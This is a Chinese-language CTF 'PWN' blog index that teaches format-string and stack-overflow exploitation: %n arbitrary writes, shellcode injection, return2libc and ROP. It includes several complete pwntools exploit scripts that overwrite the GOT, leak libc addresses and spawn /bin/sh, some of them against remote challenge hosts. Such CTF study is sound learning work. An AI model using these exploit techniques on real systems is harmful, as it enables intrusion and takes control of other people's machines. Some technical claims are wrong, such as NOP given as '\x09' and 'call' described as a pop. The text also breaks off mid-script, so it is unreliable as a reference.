<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title>PWN-格式化字符串原理</title>
      <link href="/2020/12/12/PWN-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%8E%9F%E7%90%86/"/>
      <url>/2020/12/12/PWN-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%8E%9F%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h2 id="格式化字符串原理"><a href="#格式化字符串原理" class="headerlink" title="格式化字符串原理"></a>格式化字符串原理</h2><h3 id="1-format-string"><a href="#1-format-string" class="headerlink" title="1.format string"></a>1.format string</h3><ul><li>print家族函数接受变长的字符串,其中第一个参数就是format string,后面的参数在实际运行中将与之对应</li><li>format string符号说明<ul><li>%P  将对应的参数解析为地址形式输出</li><li>%K$P 对应格式化字符串后的第K个参数,并以地址形式输出</li><li>%K$n 与格式化字符串后的第K个参数对应,将参数解析为一个地址,并取消此次输出,而将已经输出的字节长度写入获取的地址<ul><li>预调用约定</li><li>printf的参数按照参数的顺序依次存放在栈上的(32位)</li><li>对于64位机,前六个参数存放在相应的寄存器中</li></ul></li></ul></li></ul><h3 id="2-格式化字符串漏洞"><a href="#2-格式化字符串漏洞" class="headerlink" title="2.格式化字符串漏洞"></a>2.格式化字符串漏洞</h3><h4 id="1-内存泄漏-p"><a href="#1-内存泄漏-p" class="headerlink" title="1.内存泄漏(%p)"></a>1.内存泄漏(%p)</h4><ul><li>当format string中的符号个数超过参数的个数时,printf会根据调用约定到,栈上(reg)中取值</li><li>因此当我们不向printf提供更多参数时,prinf会打印出栈上本不应该被访问的值</li></ul><h4 id="2-任意地址泄漏-7-s"><a href="#2-任意地址泄漏-7-s" class="headerlink" title="2.任意地址泄漏(%7$s)"></a>2.任意地址泄漏(%7$s)</h4><ul><li>类似这样的构造会造成栈上第 7+1 个参数,所在的地址被解析,读取该地址指向的字符串</li></ul><h4 id="3-内存覆盖-k-n"><a href="#3-内存覆盖-k-n" class="headerlink" title="3. 内存覆盖(%k$n)"></a>3. 内存覆盖(%k$n)</h4><ul><li>需要清楚的是把什么值输出到哪里去?<pre><code>- 首先,写入的是%之前的字节数</code></pre><ul><li>其次写入的目的地是?<pre><code>- %n对当前偏移指向的那块空间存储的指针指向的空间写入数字,并取消此次输出- 因此,写入的地址为,用户输入的地址des(当然,需要加偏移)- 比如说你输入了一个地址,此时会有一个地址(tmp)储存你输入的地址(des),而format string 作为一个参数,在函数栈中是有地址的,而由于格式化符号大于输入参数的个数,因此函数栈中会有很多的地址存储,因此需要通过偏移量找到用户输入的地址(des),并向des指向的空间写入%之前的字节数</code></pre></li></ul></li></ul><ul><li><p>实现任意地址写入</p><ul><li><p>如何实现向任意地址写入任意字符串?</p><ul><li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=fmtstr_payload(10,&#123;atoi_got:system_plt&#125;)</span><br></pre></td></tr></table></figure></li></ul></li></ul></li></ul><h4 id="4-各种格式化字符含义"><a href="#4-各种格式化字符含义" class="headerlink" title="4.各种格式化字符含义"></a>4.各种格式化字符含义</h4><p>%c：输出字符，配上%n可用于向指定地址写数据。</p><p>%d：输出十进制整数，配上%n可用于向指定地址写数据。</p><p>%x：输出16进制数据，如%i$x表示要泄漏偏移i处4字节长的16进制数据，%i$lx表示要泄漏偏移i处8字节长的16进制数据，32bit和64bit环境下一样。</p><p>%p：输出16进制数据，与%x基本一样，只是附加了前缀0x，在32bit下输出4字节，在64bit下输出8字节，可通过输出字节的长度来判断目标环境是32bit还是64bit。</p><p>%s：输出的内容是字符串，即将偏移处指针指向的字符串输出，如%i$s表示输出偏移i处地址所指向的字符串，在32bit和64bit环境下一样，可用于读取GOT表等信息。</p><p>%n：将%n之前printf已经打印的字符个数赋值给偏移处指针所指向的地址位置，如%100x%10$n表示将0x64写入偏移10处保存的指针所指向的地址（4字节），而%$hn表示写入的地址空间为2字节，%$hhn表示写入的地址空间为1字节，%$lln表示写入的地址空间为8字节，在32bit和64bit环境下一样。有时，直接写4字节会导致程序崩溃或等候时间过长，可以通过%$hn或%$hhn来适时调整。</p><h3 id="3-实例"><a href="#3-实例" class="headerlink" title="3.实例"></a>3.实例</h3><h4 id="1-向got表中写入system的plt地址"><a href="#1-向got表中写入system的plt地址" class="headerlink" title="1.向got表中写入system的plt地址"></a>1.向got表中写入system的plt地址</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./pwn5'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./pwn5'</span>)</span><br><span class="line"></span><br><span class="line">atoi_got = elf.got[<span class="string">'atoi'</span>]</span><br><span class="line">system_plt = elf.plt[<span class="string">'system'</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#这就是如何向任意地址空间写入任意数据</span></span><br><span class="line">payload=fmtstr_payload(<span class="number">10</span>,&#123;atoi_got:system_plt&#125;)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h4 id="2-向某个空间写入具体数据"><a href="#2-向某个空间写入具体数据" class="headerlink" title="2.向某个空间写入具体数据"></a>2.向某个空间写入具体数据</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = "debug"</span></span><br><span class="line">p = remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">26486</span>)</span><br><span class="line"></span><br><span class="line">unk_804C044 = <span class="number">0x0804C044</span></span><br><span class="line">payload=fmtstr_payload(<span class="number">10</span>,&#123;unk_804C044:<span class="number">0x1111</span>&#125;)</span><br><span class="line">p.sendlineafter(<span class="string">"your name:"</span>,payload)</span><br><span class="line">p.sendlineafter(<span class="string">"your passwd"</span>,str(<span class="number">0x1111</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> PWN CTF </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>PWN-缓冲区溢出原理</title>
      <link href="/2020/12/12/PWN-%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E5%8E%9F%E7%90%86/"/>
      <url>/2020/12/12/PWN-%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E5%8E%9F%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h2 id="缓冲区溢出原理"><a href="#缓冲区溢出原理" class="headerlink" title="缓冲区溢出原理"></a>缓冲区溢出原理</h2><h3 id="1-程序内存布局"><a href="#1-程序内存布局" class="headerlink" title="1.程序内存布局"></a>1.程序内存布局</h3><ul><li><p>在程序运行的生命周期中,内存中比较重要的四部分数据是程序数据、堆、库数据、栈.此外内核空间也会映射到程序的内存中.</p><p><img src="/2020/12/12/PWN-缓冲区溢出原理/image-20201116110155289.png" alt=""></p></li></ul><ul><li>程序数据(Proc)<ul><li>代码段(Text seg)<pre><code>- 主要存放可执行文件的代码指令,是可执行程序在内存中的镜像,代码段一般是只读的</code></pre><ul><li>数据段(Data seg)</li><li>存放可执行文件中已经初始化的变量,包括静态分配的变量和全局变量</li><li>BSS seg</li><li>包含程序中未初始化的全局变量,在内存中bss 段全部置0</li><li>堆(HEAP)</li><li>存放进程运行过程中动态申请的内存段.进程调用malloc、alloca、new等函数来申请内存,利用free、delete函数释放内存.这部分大小不固定,以方便程序灵活使用内存.</li><li>库数据(Memory Mapping)</li><li>存放映射的系统库文件,其中比较重要的是libc库,很多的程序所使用的系统函数都会动态的连接到libc库中</li><li>栈(Stack)</li><li>栈存放程序临时创建的局部变量.包括函数内部的临时变量和调用函数时压入的参数.由于</li></ul></li></ul></li></ul><h3 id="1-函数调用栈"><a href="#1-函数调用栈" class="headerlink" title="1. 函数调用栈"></a>1. <a href="https://zhuanlan.zhihu.com/p/25816426" target="_blank" rel="noopener">函数调用栈</a></h3><ul><li><p>栈介绍</p><ul><li><p>栈内存一般根据函数栈来进行划分,不同函数栈之间是相互隔离的,从而能够实现有效的函数切换</p></li><li><p>函数栈上存储的信息一般包括</p><ul><li><p>临时变量 (canary)</p></li><li><p>函数的返回栈基址(bp)</p></li><li><p>函数的返回地址(ip)</p></li></ul></li></ul></li></ul><ul><li><p>函数栈的调用机制</p><ul><li><p>程序运行时,为了实现函数之间的相互隔离,需要在进入新的函数之前保存当前函数的状态</p></li><li><p>函数调用时,首先将参数压入栈,然后压入返回地址和栈底指针寄存器bp,其中压入返回地址是通过call实现的</p></li><li><p>函数结束时,将sp重新指向bp位置,并弹出bp和返回地址==ip==,通常bp是通过leave或者(pop ebp实现的)</p></li><li><p>函数栈示意图</p><ul><li><img src="/2020/12/12/PWN-缓冲区溢出原理/image-20201116150123844.png" alt=""></li></ul></li></ul></li></ul><pre><code>- 在函数栈中bp存储了上一个函数栈的基址,ip存储的是调用处的下一条指令的位置.- 返回当前函数时,会从栈上弹出这两个值,从而恢复上一个函数的信息</code></pre><ul><li><p>函数参数的传递</p><ul><li><p>函数调用协议</p><ul><li>_stdcall: wimdows API默认的函数调用协议<ul><li>参数由由右向左入栈</li><li>调用函数结束后由被调用函数来平衡栈</li></ul></li><li>_cdecl: c++/c默认的函数调用协议<ul><li>参数由右向左入栈</li><li>函数调用结束后由函数调用者来平衡栈</li></ul></li><li>_fastcall:适用于对性能要求较高的场合<ul><li>从左开始将不大于4字节的参数放入CPU的ecx和edx寄存器,其余参数从右向左入栈</li><li>函数调用结束后,由被调用者来平衡栈</li></ul></li></ul></li><li><p>对于X86程序</p><ul><li><p>普通函数传参:参数基本都压在栈上(也有寄存器传参的情况)</p></li><li><p>syscall传参: eax对应系统调用号,ebx,ecx,edx,esi,edi,ebp分别对应前六个参数,多余的参数压在栈上</p></li><li><p>==对于x86程序而言,参数传递是通过栈来实现的,在调用完以后,需要清除栈中参数,所以一般函数调用完之后需要用形如“pop;pop *;,,,,;ret;”的 gadget来调整.因为函数调用时返回地址会压入栈中,既汇编中的“call func”指令等同于“pop ret_addr;jump func”,因此在执行jmp func的时候,ret_addr已经压入栈中了==</p><p><img src="/2020/12/12/PWN-缓冲区溢出原理/image-20201116160723459.png" alt=""></p></li></ul></li></ul></li></ul><pre><code>- 将ret_addr改成”pop*；ret“指令的gadget，用来弹出后续的args，即成为ROP的形式，这也是ROP的原理  ![](image-20201116160738116.png)</code></pre><ul><li><p>对于X64程序</p><ul><li><p>普通函数传参:先使用rdi,rsi,rdx,r8,r9寄存器作为函数参数的前六个参数,多余的参数依次压在栈上</p></li><li><p>syscall传参:rax对应系统调用号,传参规则和普通函数一样</p></li><li><p>对于X64的程序来说，一般情况下，函数的参数较少，通常用寄存器来传递参数，所以在进入函数之前，因该先将寄存器设置好</p><p><img src="/2020/12/12/PWN-缓冲区溢出原理/image-20201116161212714.png" alt=""></p></li></ul></li></ul><ul><li><p>函数运行时内存中的一段连续的区域,用来保存函数运行时的状态信息,包括参数与局部变量</p><p><img src="/2020/12/12/PWN-缓冲区溢出原理/image-20201027195726522.png" alt=""></p></li></ul><ul><li><h5 id="涉及的寄存器"><a href="#涉及的寄存器" class="headerlink" title="涉及的寄存器"></a>涉及的寄存器</h5><ul><li><p>栈寄存器</p><ul><li>esp: 用来存储函数调用栈的栈顶地址,在压栈和退栈时发生变化</li><li>ebp:用来存储当前函数状态的基地址,在函数运行时不变,可以用来索引函数参数或局部变量的位置</li></ul></li><li><p>特殊寄存器</p><ul><li><p>eip:用来存储即将执行的程序指令的地址,cpu按照eip的存储内容读取指令并执行,eip随之指向下一条指令,如此反复</p></li><li><p>Eflags:标识位寄存器</p></li><li><p>cs(code segment):储存代码段的地址</p></li><li><p>ds(data segment):储存数据段的地址</p></li><li><p>ss(stack segment):储存函数调用栈的地址</p></li></ul></li></ul></li></ul><ul><li><p>一般寄存器</p><ul><li>eax(Accumulate):累加寄存器,用于进行算数运算,返回函数结果</li><li>ebx(Base):基址寄存器,在内存寻址时(比如数组运算),存放基地址</li><li>ecx(Count):计数寄存器,用以在循环中计数</li><li>edx(Data):数据寄存器,通常配合eax存放运算结果等数据</li></ul></li><li><p>索引寄存器</p><ul><li>esi(Souce Index):指向要处理数据的地址</li><li>edi(Destination Index): 指向存放数据结果的地址</li></ul></li></ul><ul><li><p>涉及的汇编指令</p><ul><li>MOV DST,SRC; (数据传输指令) 将src中的数据传输到dst中</li><li>PUSH SRC; (压入堆栈指令)将SRC压入栈</li><li>POP DST;(弹出堆栈指令) 弹出堆栈指令,将栈顶的数据弹出并保存至DST</li><li>LEA REG,MEM; (取地址指令)将MEM的地址存在REG中</li><li>ADD/SUB DST,SRC;(加减指令)</li><li>CALL PTR;(调用指令 )将当前的eip压入栈顶,并将PTR存入eip</li><li>RET ;(返回指令)将栈顶数据弹出至eip</li></ul></li><li><p>调用函数时,栈的变化(如何抛弃被调用函数的状态)</p><p><img src="/2020/12/12/PWN-缓冲区溢出原理/image-20201027201145127.png" alt=""></p></li></ul><p>  <img src="/2020/12/12/PWN-缓冲区溢出原理/image-20201027201543440.png" alt=""></p><p>  <img src="/2020/12/12/PWN-缓冲区溢出原理/image-20201027201451467.png" alt=""></p><p>  <img src="/2020/12/12/PWN-缓冲区溢出原理/image-20201027201645337.png" alt=""></p><p><img src="/2020/12/12/PWN-缓冲区溢出原理/image-20201027201738540.png" alt=""></p><p><img src="/2020/12/12/PWN-缓冲区溢出原理/image-20201027201912962.png" alt=""></p><p><img src="/2020/12/12/PWN-缓冲区溢出原理/image-20201027202008746.png" alt=""></p><h3 id="2-技术清单"><a href="#2-技术清单" class="headerlink" title="2.技术清单"></a>2.技术清单</h3><ul><li><p>覆盖缓冲区的具体用途</p><ul><li><p>覆盖当前栈中函数的返回地址（当前函数或者之前的函数），获取控制流</p></li><li><p>覆盖栈中所存储的临时变量</p></li><li><p>覆盖栈底寄存器bp（之前的函数）</p><ul><li><p>覆盖bp实现栈转移</p><ul><li><p>这种情况主要针对“leave；ret”指令；该指令等价于“mov sp,bp;pop bp;ret”</p><p><img src="/2020/12/12/PWN-缓冲区溢出原理/image-20201116162151945.png" alt=""></p></li></ul></li><li><p>覆盖bp，实现参数索引改变</p><ul><li>一般来说，很多临时变量的索引，都是根据相对于bp的偏移量来进行的，如果bp发生了变化，那么后续的很多参数也会发生变化</li></ul></li></ul></li><li><p>关注敏感函数</p><ul><li>background<ul><li>控制指令执行最关键的寄存器就是eip,因此我们的==<strong>目标</strong>是让eip载入攻击指令的地址==</li><li>如何让eip指向攻击指令,</li><li><img src="/2020/12/12/PWN-缓冲区溢出原理/image-20201027202257764.png" alt=""></li></ul></li></ul></li></ul></li><li>list<ul><li>修改返回地址,使其指向溢出数据中的一段指令==(shellcode)==</li><li>修改返回地址,使其指向内存中已有的某个函数==(return2libc==)</li><li>修改返回地址,使其指向内存中已有的某段指令==(ROP)==</li><li>修改某个被调用的函数的地址,让其指向另一个函数==(hijack GOT)==</li></ul></li></ul><h4 id="1-Shellcode-关闭地址随机化以及有可执行权限"><a href="#1-Shellcode-关闭地址随机化以及有可执行权限" class="headerlink" title="1.Shellcode(关闭地址随机化以及有可执行权限)"></a>1.Shellcode(关闭地址随机化以及有可执行权限)</h4><ul><li>payload = padding1 + address of shellcode + padding2 + shellcode</li><li><p><img src="/2020/12/12/PWN-缓冲区溢出原理/image-20201027211319900.png" alt=""></p></li><li><p>padding1 中的数据随便填充(⚠️如果是字符串输入,避免\x00,可能会被截断),==长度应该刚好覆盖函数的基地址==</p><ul><li>==问题一==:padding1因该多长?<ul><li>可以通过调试工具(GDB)查看汇编代码来确定这个值==一般是lea指令+4==</li><li>也可以通过程序不断增加输入长度来试探(如果返回地址被无效地址如”AAA“覆盖)程序会报错</li></ul></li></ul></li><li>address of shellcode 是后面shellcode处的起始处的地址,==用来覆盖返回地址==<ul><li>==问题二:==shellcode 的起始地址是多少?<ul><li>可以通过调试工具查看返回值的地址(ebp中的内容+4, 32位机)</li><li>但是调试里的地址可能和正常运行时不一样,此时就可以通过在padding2中填充若干长度的==“\x09”==,此机器码对应的指令是NOP(No Operation),既告诉cpu啥也不用做,然后跳到下一指令,有了NOP的填充,只要返回地址能够命中这一段中的任一位置,都可以跳转到shellcode的起始处</li></ul></li></ul></li><li>padding2可以随意填充,长度任意.</li><li>shellcode因该是16进制机器码的格式</li><li><img src="/2020/12/12/PWN-缓冲区溢出原理/image-20201027213551447.png" alt=""></li></ul><h5 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">'node3.buuoj.cn'</span>,<span class="number">29955</span>)</span><br><span class="line">elf = ELF(<span class="string">'./ciscn_2019_n_5'</span>)</span><br><span class="line"><span class="comment">#这句话非常重要,因为设置arch决定了👇shell的汇编结果,不同arch下得到的结果是不一样的</span></span><br><span class="line">context.arch = elf.arch</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">bss_addr = <span class="number">0x601080</span></span><br><span class="line">shellcode = asm(shellcraft.sh())<span class="comment">#生成64位linuxshellcode</span></span><br><span class="line">payload = <span class="string">b'a'</span>*<span class="number">0x20</span> + <span class="string">b'a'</span>*<span class="number">8</span> + p64(<span class="number">0x601080</span>)<span class="comment">#栈溢出ret到shellcode执行</span></span><br><span class="line"></span><br><span class="line">sh.sendlineafter(<span class="string">"name\n"</span>,shellcode)</span><br><span class="line">sh.sendlineafter(<span class="string">"me?\n"</span>,payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h4 id="2-return2libc–指向内存中的函数-操作系统关闭ASLR"><a href="#2-return2libc–指向内存中的函数-操作系统关闭ASLR" class="headerlink" title="2.return2libc–指向内存中的函数(操作系统关闭ASLR)"></a>2.return2libc–指向内存中的函数(操作系统关闭ASLR)</h4><ul><li><p>获取libc中的system函数的地址,使用gdb,给main函数打上断点,然后使用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p system</span><br></pre></td></tr></table></figure><p>该方法可以获取任意libc函数的地址</p></li><li><p>设置system函数返回后的地址,以及为system函数构造我们预定的参数</p></li><li><p>由于我们使用system的函数地址替换了原本的ip寄存器,强制执行了system函数.破坏了原程序栈桢分配和释放策略,所以后续的操作必须基于这个被破坏的栈桢结构来实现</p></li><li><p>例如下面的payload中的padding2的操作应该是pop ip,也就是system函数调用完成后需要返回的地址</p><ul><li>为什么呢?<ul><li>因为在正常情况下,函数是通过call进行调用的,因此在进入system前,call指令已经通过push ip将返回地址push到函数调用栈中,所以在正常情况下ret指令pop到ip的数据就是call指令push到栈中的数据,也就是说两者是成对出现的</li><li>但是!!!!由于我们是直接通过覆盖ip的地址从而跳转到system函数,并没有经过call指令的调用,也就是并没有push ip的操作,但是system函数却照常执行了ret指令的pop ip的操作.</li><li>因此,ret 指令pop到ip中的到底是哪一处的数据呢,答案就是padding2中的数据,也就是我们自己设定的system函数的返回地址</li></ul></li></ul></li><li><p>知道了system部分的payload,那么如何获得system的地址以及bin/sh的地址呢?</p><ul><li><p>可以通过puts与gets函数,gets造成溢出,puts泄漏libc中的system以及/bin/sh的地址</p><ul><li><p>bin在so文件中的地址</p><ul><li><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings -t x libc.so | grep bin</span><br></pre></td></tr></table></figure></li></ul></li><li><p>可执行的system(“/bin/sh”)在so文件中的地址</p><ul><li><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">one_gadget  libc.so</span><br></pre></td></tr></table></figure></li></ul></li></ul></li></ul></li></ul><ul><li><p>由于我们可以控制栈,根据rop的思想,我们需要找到的就是pop rdi;ret 前半段用于给第一个参数rdi赋值,后半段用于跳到其他代码片段</p><ul><li><p>如何找到可以赋值的参数呢?</p><ul><li><p>可以通过,ROPgadget,这里的值通常是固定的0x400833</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary file_name --only <span class="string">"pop|ret"</span> | grep rdi</span><br></pre></td></tr></table></figure></li></ul></li></ul></li></ul><ul><li>因此我们可以构造payload泄漏出puts函数的真实地址</li></ul><ul><li><p>有了真实地址,我们还需要知道程序使用的libc,算出libc的基址</p><ul><li><p>这里可以使用<a href="https://github.com/lieanu/LibcSearcher" target="_blank" rel="noopener">LibcSearcher</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#第二个参数，为已泄露的实际地址,或最后12位(比如：d90)，int类型</span></span><br><span class="line">obj = LibcSearcher(<span class="string">"fgets"</span>, <span class="number">0X7ff39014bd90</span>)</span><br></pre></td></tr></table></figure></li><li><p>知道了程序使用的libc,以及puts函数的真实地址,我们就可算出libc的基址,再通过基址加偏移就能得到函数的真实地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">libc_base = <span class="number">0X7ff39014bd90</span> - obj.dump(<span class="string">"fgets"</span>)</span><br><span class="line">obj.dump(<span class="string">"system"</span>)        <span class="comment">#system 偏移</span></span><br><span class="line">obj.dump(<span class="string">"str_bin_sh"</span>)    <span class="comment">#/bin/sh 偏移</span></span><br><span class="line"><span class="comment">#system的真实地址</span></span><br><span class="line">system_addr =libc_base +  obj.dump(<span class="string">"system"</span>)</span><br></pre></td></tr></table></figure></li></ul></li></ul><ul><li><p>这里有可能会遇到,匹配不到libc的错误,可以通过<a href="https://github.com/niklasb/libc-database" target="_blank" rel="noopener">libc-database</a>,添加libc</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">./get  <span class="comment"># List categories</span></span><br><span class="line">./get ubuntu debian  <span class="comment"># Download Ubuntu's and Debian's libc, old default behavior</span></span><br><span class="line">./get all  <span class="comment"># Download all categories. Can take a while!</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#或者添加自身的libc</span></span><br><span class="line">./add /usr/lib/libc-2.21.so</span><br></pre></td></tr></table></figure></li></ul><h5 id="实例-1"><a href="#实例-1" class="headerlink" title="实例"></a>实例</h5><ul><li>64位</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="comment">#p = remote('node3.buuoj.cn',25805)</span></span><br><span class="line">p = process(<span class="string">'./ciscn_2019_c_1'</span>)</span><br><span class="line">elf = ELF(<span class="string">'ciscn_2019_c_1'</span>)</span><br><span class="line">puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">pop_rdi = <span class="number">0x400c83</span></span><br><span class="line">main_addr = <span class="number">0x400b28</span></span><br><span class="line">p.recvuntil(<span class="string">'!\n'</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b'\x00'</span>*<span class="number">0x58</span>+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main_addr)</span><br><span class="line">print(<span class="string">"payload=====&gt;"</span>+str(payload))</span><br><span class="line">p.recvuntil(<span class="string">'ed\n'</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">'\n\n'</span>)</span><br><span class="line">puts_real_addr = u64(p.recvuntil(<span class="string">'\n'</span>, drop=<span class="keyword">True</span>).ljust(<span class="number">8</span>, <span class="string">b'\x00'</span>))</span><br><span class="line">print(<span class="string">'puts real addr ====&gt;'</span>+str(hex(puts_real_addr)))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">'puts'</span>,puts_real_addr)</span><br><span class="line">libc_base = puts_real_addr - libc.dump(<span class="string">'puts'</span>)</span><br><span class="line">print(<span class="string">'libc_base====&gt;'</span>+str(libc_base))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">system = libc_base + libc.dump(<span class="string">'system'</span>)</span><br><span class="line">bin_sh = libc_base + libc.dump(<span class="string">'str_bin_sh'</span>)</span><br><span class="line"></span><br><span class="line">print(<span class="string">"system ====&gt;"</span>+str(hex(system)))</span><br><span class="line">print(<span class="string">"bin_sh ====&gt;"</span>+str(hex(bin_sh)))</span><br><span class="line"></span><br><span class="line">ret = <span class="number">0x4006b9</span></span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b'\x00'</span>*<span class="number">0x58</span> +p64(ret)+ p64(pop_rdi) + p64(bin_sh) + p64(system) </span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><ul><li>32位</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">r=remote(<span class="string">'node3.buuoj.cn'</span>,<span class="number">28001</span>)</span><br><span class="line"><span class="comment">#r=process('./pwn')</span></span><br><span class="line">elf=ELF(<span class="string">'./pwn'</span>)</span><br><span class="line">write_plt=elf.plt[<span class="string">'write'</span>]</span><br><span class="line">read_got=elf.got[<span class="string">'read'</span>]</span><br><span class="line">read_plt=elf.plt[<span class="string">'read'</span>]</span><br><span class="line">main_addr=<span class="number">0x8048825</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#溢出控制返回值v5</span></span><br><span class="line">payload1=<span class="string">b'\x00'</span>+<span class="string">b'a'</span>*<span class="number">6</span>+<span class="string">b'\xff'</span></span><br><span class="line">r.sendline(payload1)</span><br><span class="line">r.recvuntil(<span 